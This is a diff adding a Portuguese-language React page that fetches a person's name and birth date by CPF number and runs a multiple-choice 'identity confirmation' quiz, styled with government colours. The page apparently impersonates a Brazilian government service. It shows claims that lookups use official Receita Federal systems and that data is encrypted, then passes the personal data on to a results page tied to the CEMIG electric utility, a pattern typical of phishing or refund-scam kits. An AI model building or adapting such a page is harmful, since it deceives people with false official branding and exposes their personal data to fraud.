@@ -1,0 +1,362 @@
+import { useState, useEffect } from "react";
+import { useLocation, useRoute } from "wouter";
+import { Button } from "@/components/ui/button";
+import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
+import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
+import { Label } from "@/components/ui/label";
+import { Card, CardContent } from "@/components/ui/card";
+import { useToast } from "@/hooks/use-toast";
+import { z } from "zod";
+import { useForm } from "react-hook-form";
+import { zodResolver } from "@hookform/resolvers/zod";
+import Header from "@/components/Header";
+import Footer from "@/components/Footer";
+import { useQueryClient } from "@tanstack/react-query";
+import { ArrowRight } from "lucide-react";
+
+enum EtapaVerificacao {
+  NOME = 0,
+  ANO_NASCIMENTO = 1,
+}
+
+// Definir o esquema de validação para o formulário
+const nomeSchema = z.object({
+  nome: z.string().min(1, "Selecione uma opção"),
+});
+
+const anoSchema = z.object({
+  ano: z.string().min(1, "Selecione uma opção"),
+});
+
+type NomeFormValues = z.infer<typeof nomeSchema>;
+type AnoFormValues = z.infer<typeof anoSchema>;
+
+export default function ConfirmarIdentidade() {
+  const [, navigate] = useLocation();
+  const [, params] = useRoute<{ cpf: string }>("/confirmar-identidade/:cpf");
+  const cpf = params?.cpf || "";
+  const { toast } = useToast();
+  const queryClient = useQueryClient();
+  
+  const [etapaAtual, setEtapaAtual] = useState<EtapaVerificacao>(EtapaVerificacao.NOME);
+  const [dadosPessoais, setDadosPessoais] = useState<any>(null);
+  const [opcoesNome, setOpcoesNome] = useState<string[]>([]);
+  const [opcoesAno, setOpcoesAno] = useState<string[]>([]);
+  const [isLoading, setIsLoading] = useState<boolean>(false);
+
+  // Formulário para seleção de nome
+  const nomeForm = useForm<NomeFormValues>({
+    resolver: zodResolver(nomeSchema),
+    defaultValues: {
+      nome: "",
+    },
+  });
+
+  // Formulário para seleção de ano
+  const anoForm = useForm<AnoFormValues>({
+    resolver: zodResolver(anoSchema),
+    defaultValues: {
+      ano: "",
+    },
+  });
+
+  useEffect(() => {
+    if (!cpf) {
+      navigate("/verificar");
+      return;
+    }
+
+    // Carregar dados do CPF
+    const fetchCpfData = async () => {
+      setIsLoading(true);
+      try {
+        const response = await fetch(`/api/consulta-cpf?cpf=${cpf}`);
+        if (!response.ok) {
+          throw new Error("Erro ao consultar CPF");
+        }
+        const data = await response.json();
+        setDadosPessoais(data);
+        
+        // Preparar opções de nome
+        const nomeCorreto = data.Result.NomePessoaFisica;
+        const nomesAlternativos = [
+          "MÔNICA DE SOUZA ALVES",
+          "VINICIUS CESAR FILHO"
+        ];
+        
+        let opcoes = [...nomesAlternativos];
+        if (!opcoes.includes(nomeCorreto)) {
+          opcoes = opcoes.slice(0, 2);
+          opcoes.push(nomeCorreto);
+        }
+        
+        // Embaralhar os nomes
+        const embaralharArray = (array: string[]): string[] => {
+          const arrayCopia = [...array];
+          for (let i = arrayCopia.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [arrayCopia[i], arrayCopia[j]] = [arrayCopia[j], arrayCopia[i]];
+          }
+          return arrayCopia;
+        };
+        
+        setOpcoesNome(embaralharArray(opcoes));
+        
+        // Preparar opções de ano
+        const dataNascimento = data.Result.DataNascimento;
+        const anoCorreto = getAnoNascimento(dataNascimento);
+        
+        const gerarAnoAleatorio = () => {
+          const anoCorretoNum = parseInt(anoCorreto);
+          const variacao = Math.floor(Math.random() * 15) + 1; // Variação de 1 a 15 anos
+          const sinal = Math.random() > 0.5 ? 1 : -1;
+          return (anoCorretoNum + variacao * sinal).toString();
+        };
+        
+        // Gerar 2 anos aleatórios diferentes
+        const anosAleatorios: string[] = [];
+        while (anosAleatorios.length < 2) {
+          const anoAleatorio = gerarAnoAleatorio();
+          if (!anosAleatorios.includes(anoAleatorio) && anoAleatorio !== anoCorreto) {
+            anosAleatorios.push(anoAleatorio);
+          }
+        }
+        
+        // Adicionar o ano correto e embaralhar
+        setOpcoesAno(embaralharArray([...anosAleatorios, anoCorreto]));
+        
+      } catch (error) {
+        console.error("Erro ao buscar dados do CPF:", error);
+        toast({
+          title: "Erro",
+          description: "Não foi possível verificar o CPF. Tente novamente mais tarde.",
+          variant: "destructive",
+        });
+        navigate("/verificar");
+      } finally {
+        setIsLoading(false);
+      }
+    };
+
+    fetchCpfData();
+  }, [cpf, navigate, toast]);
+
+  // Extrair o ano da data de nascimento
+  const getAnoNascimento = (dataStr: string): string => {
+    if (!dataStr) return "";
+    
+    // Verificar se é uma data no formato ISO completo
+    if (dataStr.includes("T")) {
+      const dataObj = new Date(dataStr);
+      if (isNaN(dataObj.getTime())) return "";
+      return dataObj.getFullYear().toString();
+    }
+    
+    // Formato YYYY-MM-DD simples
+    return dataStr.split("-")[0];
+  };
+
+  // Transformar data no formato ISO para DD/MM/YYYY
+  const formatarData = (dataStr: string) => {
+    if (!dataStr) return "";
+    
+    // Verificar se é uma data no formato ISO completo
+    if (dataStr.includes("T")) {
+      const dataObj = new Date(dataStr);
+      if (isNaN(dataObj.getTime())) return dataStr;
+      
+      return `${dataObj.getDate().toString().padStart(2, '0')}/${(dataObj.getMonth() + 1).toString().padStart(2, '0')}/${dataObj.getFullYear()}`;
+    }
+    
+    // Formato YYYY-MM-DD simples
+    const partes = dataStr.split("-");
+    if (partes.length !== 3) return dataStr;
+    
+    return `${partes[2].substring(0, 2)}/${partes[1]}/${partes[0]}`;
+  };
+
+  // Lidar com o envio do formulário de nome
+  const onSubmitNome = (values: NomeFormValues) => {
+    const nomeCorreto = dadosPessoais?.Result?.NomePessoaFisica || "";
+    
+    if (values.nome === nomeCorreto) {
+      setEtapaAtual(EtapaVerificacao.ANO_NASCIMENTO);
+    } else {
+      toast({
+        title: "Nome incorreto",
+        description: "Por favor, selecione seu nome correto.",
+        variant: "destructive",
+      });
+    }
+  };
+
+  // Lidar com o envio do formulário de ano
+  const onSubmitAno = (values: AnoFormValues) => {
+    const dataNascimento = dadosPessoais?.Result?.DataNascimento || "";
+    const anoCorreto = getAnoNascimento(dataNascimento);
+    
+    if (values.ano === anoCorreto) {
+      // Extrair dados para a próxima etapa
+      const nome = dadosPessoais?.Result?.NomePessoaFisica || "";
+      const dataNasc = formatarData(dadosPessoais?.Result?.DataNascimento || "");
+      
+      // Detectar o estado usando IP para uma experiência mais seamless
+      const estado = "Minas Gerais"; // Valor padrão, será escolhido pelo usuário na próxima etapa
+      const companhia = "CEMIG Distribuição"; // Valor padrão, será escolhido pelo usuário na próxima etapa
+      
+      const params = new URLSearchParams();
+      params.append("cpf", cpf);
+      params.append("nome", nome);
+      params.append("nasc", dataNasc);
+      params.append("estado", estado);
+      params.append("companhia", companhia);
+      
+      // Navegar para a página de resultado
+      navigate(`/resultado?${params.toString()}`);
+    } else {
+      toast({
+        title: "Ano incorreto",
+        description: "Por favor, selecione o ano correto do seu nascimento.",
+        variant: "destructive",
+      });
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex flex-col">
+      <Header />
+      
+      <main className="flex-1 bg-[#f0f2f5] py-8">
+        <div className="container mx-auto px-4">
+          <div className="max-w-4xl mx-auto">
+            <Card className="shadow-md">
+              <CardContent className="p-6">
+                <div className="space-y-6">
+                  <div className="text-center mb-6">
+                    <h1 className="text-2xl font-bold text-[var(--gov-blue-dark)]">
+                      Confirmação de Identidade
+                    </h1>
+                    <p className="text-[var(--gov-gray-dark)]">
+                      Para confirmar sua identidade, precisamos validar alguns dados pessoais.
+                    </p>
+                  </div>
+
+                  {etapaAtual === EtapaVerificacao.NOME && (
+                    <div>
+                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
+                        Selecione o seu nome completo entre as opções abaixo:
+                      </h2>
+                      
+                      <Form {...nomeForm}>
+                        <form onSubmit={nomeForm.handleSubmit(onSubmitNome)} className="space-y-4">
+                          <FormField
+                            control={nomeForm.control}
+                            name="nome"
+                            render={({ field }) => (
+                              <FormItem className="space-y-4">
+                                <FormControl>
+                                  <RadioGroup
+                                    onValueChange={field.onChange}
+                                    value={field.value}
+                                    className="space-y-3"
+                                  >
+                                    {opcoesNome.map((nome, index) => (
+                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
+                                        <RadioGroupItem value={nome} id={`nome-${index}`} />
+                                        <Label htmlFor={`nome-${index}`} className="flex-1 cursor-pointer">
+                                          {nome}
+                                        </Label>
+                                      </div>
+                                    ))}
+                                  </RadioGroup>
+                                </FormControl>
+                                <FormMessage />
+                              </FormItem>
+                            )}
+                          />
+
+                          <div className="text-center mt-6">
+                            <Button 
+                              type="submit"
+                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
+                              disabled={isLoading || !nomeForm.watch("nome")}
+                            >
+                              <i className="fas fa-arrow-right mr-2"></i>
+                              <span>Prosseguir</span>
+                            </Button>
+                          </div>
+                        </form>
+                      </Form>
+                    </div>
+                  )}
+
+                  {etapaAtual === EtapaVerificacao.ANO_NASCIMENTO && (
+                    <div>
+                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
+                        Agora, selecione o ano do seu nascimento entre as opções abaixo:
+                      </h2>
+                      
+                      <Form {...anoForm}>
+                        <form onSubmit={anoForm.handleSubmit(onSubmitAno)} className="space-y-4">
+                          <FormField
+                            control={anoForm.control}
+                            name="ano"
+                            render={({ field }) => (
+                              <FormItem className="space-y-4">
+                                <FormControl>
+                                  <RadioGroup
+                                    onValueChange={field.onChange}
+                                    value={field.value}
+                                    className="space-y-3"
+                                  >
+                                    {opcoesAno.map((ano, index) => (
+                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
+                                        <RadioGroupItem value={ano} id={`ano-${index}`} />
+                                        <Label htmlFor={`ano-${index}`} className="flex-1 cursor-pointer">
+                                          {ano}
+                                        </Label>
+                                      </div>
+                                    ))}
+                                  </RadioGroup>
+                                </FormControl>
+                                <FormMessage />
+                              </FormItem>
+                            )}
+                          />
+
+                          <div className="text-center mt-6">
+                            <Button 
+                              type="submit"
+                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
+                              disabled={isLoading || !anoForm.watch("ano")}
+                            >
+                              <i className="fas fa-arrow-right mr-2"></i>
+                              <span>Prosseguir</span>
+                            </Button>
+                          </div>
+                        </form>
+                      </Form>
+                    </div>
+                  )}
+
+                  {/* Requisitos de segurança */}
+                  <div className="mt-8 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
+                    <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informações de Segurança:</h3>
+                    <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
+                      <li>• Seus dados são protegidos e criptografados.</li>
+                      <li>• A consulta é feita nos sistemas oficiais da Receita Federal.</li>
+                      <li>• É necessário confirmar sua identidade para prosseguir.</li>
+                      <li>• Não compartilhamos seus dados com terceiros.</li>
+                    </ul>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          </div>
+        </div>
+      </main>
+      
+      <Footer />
+    </div>
+  );
+}
